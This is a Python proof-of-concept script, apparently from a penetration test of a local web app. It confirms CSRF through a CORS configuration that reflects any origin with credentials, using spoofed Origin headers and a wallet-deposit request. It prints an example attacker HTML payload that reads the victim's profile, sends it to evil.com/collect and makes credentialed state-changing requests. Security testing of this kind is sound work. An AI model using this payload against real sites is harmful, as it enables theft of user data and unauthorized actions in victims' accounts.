#!/usr/bin/env python3
"""
WSTG-SESS-05: CSRF via Permissive CORS Configuration

Vulnerability: The application configures CORS with:

    app.use(cors({
        origin: process.env.CORS_ORIGIN || true,
        credentials: true
    }));

When origin is `true`, the cors middleware reflects ANY requesting origin
in the Access-Control-Allow-Origin header and always includes
Access-Control-Allow-Credentials: true. This means any website can make
authenticated cross-origin requests to the API.

Combined with no CSRF token validation on state-changing endpoints, this
allows a malicious website to perform actions on behalf of any logged-in
user who visits the attacker's site.

Impact: Full CSRF. A malicious website can perform any action as the victim:
modify profile, create contracts, send messages, transfer funds, etc.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]


def try_login(accounts):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            return resp.json()["token"], resp.json()["user"]
    print("    ERROR: No account could be logged in.")
    sys.exit(1)


def main():
    print("=" * 70)
    print("WSTG-SESS-05: CSRF via Permissive CORS - Any Origin Allowed")
    print("=" * 70)

    # Step 1: Login to get an auth token
    print("\n[1] Logging in...")
    token, user = try_login(CLIENT_ACCOUNTS)
    headers_auth = {"Authorization": f"Bearer {token}"}
    print(f"    User: {user['email']}")

    # Step 2: Test CORS with an arbitrary Origin header
    print("\n[2] Testing CORS preflight with arbitrary Origin headers...\n")

    evil_origins = [
        "https://evil.com",
        "https://attacker.example.org",
        "http://malicious-site.io",
        "null",
    ]

    for origin in evil_origins:
        # Send an OPTIONS preflight request
        preflight_resp = requests.options(
            f"{BASE_URL}/api/auth/me",
            headers={
                "Origin": origin,
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "Authorization,Content-Type"
            }
        )

        acao = preflight_resp.headers.get("Access-Control-Allow-Origin", "NOT SET")
        acac = preflight_resp.headers.get("Access-Control-Allow-Credentials", "NOT SET")
        acah = preflight_resp.headers.get("Access-Control-Allow-Headers", "NOT SET")

        print(f"    Origin: {origin}")
        print(f"      Access-Control-Allow-Origin: {acao}")
        print(f"      Access-Control-Allow-Credentials: {acac}")
        print(f"      Status: {preflight_resp.status_code}")

        if acao == origin or acao == "*":
            print(f"      [VULNERABLE] Server reflects the attacker's origin!")
        if acac == "true":
            print(f"      [VULNERABLE] Credentials are allowed!")
        print()

    # Step 3: Demonstrate actual cross-origin authenticated request
    print("[3] Simulating cross-origin authenticated request from evil.com...")
    resp = requests.get(
        f"{BASE_URL}/api/auth/me",
        headers={
            **headers_auth,
            "Origin": "https://evil.com"
        }
    )

    print(f"    Status: {resp.status_code}")
    acao = resp.headers.get("Access-Control-Allow-Origin", "NOT SET")
    acac = resp.headers.get("Access-Control-Allow-Credentials", "NOT SET")
    print(f"    Access-Control-Allow-Origin: {acao}")
    print(f"    Access-Control-Allow-Credentials: {acac}")

    if resp.status_code == 200:
        user_data = resp.json().get("user", {})
        print(f"    [VULNERABLE] Got user data from evil.com origin!")
        print(f"    Email: {user_data.get('email', 'N/A')}")
        print(f"    Role: {user_data.get('role', 'N/A')}")

    # Step 4: Demonstrate state-changing request from evil origin
    print("\n[4] Simulating state-changing POST from evil.com origin...")
    resp = requests.post(
        f"{BASE_URL}/api/payments/wallet/deposit",
        json={"amount": 1, "description": "CSRF test deposit"},
        headers={
            **headers_auth,
            "Origin": "https://evil.com",
            "Content-Type": "application/json"
        }
    )

    print(f"    Status: {resp.status_code}")
    acao = resp.headers.get("Access-Control-Allow-Origin", "NOT SET")
    acac = resp.headers.get("Access-Control-Allow-Credentials", "NOT SET")
    print(f"    Access-Control-Allow-Origin: {acao}")
    print(f"    Access-Control-Allow-Credentials: {acac}")

    if resp.status_code == 200:
        print(f"    [VULNERABLE] State-changing request accepted from evil.com!")
        print(f"    Response: {resp.json()}")

    # Step 5: Show the attack scenario with HTML
    print("\n[5] Example attacker HTML payload:")
    print("""
    <!-- Hosted on https://evil.com/steal.html -->
    <script>
    // This works because the server reflects any Origin
    // and allows credentials
    fetch('http://localhost:3000/api/auth/me', {
        credentials: 'include'  // sends cookies
    })
    .then(r => r.json())
    .then(data => {
        // Exfiltrate user data
        fetch('https://evil.com/collect', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });

    // Or perform state-changing actions
    fetch('http://localhost:3000/api/payments/wallet/deposit', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({amount: 1000})
    });
    </script>
    """)

    # Summary
    print("=" * 70)
    print("RESULT: CSRF via permissive CORS confirmed.")
    print("  - origin: true reflects ANY requesting origin")
    print("  - credentials: true allows cookies/auth headers")
    print("  - No CSRF tokens on any endpoints")
    print("  - Any website can make authenticated requests to the API")
    print("=" * 70)


if __name__ == "__main__":
    main()
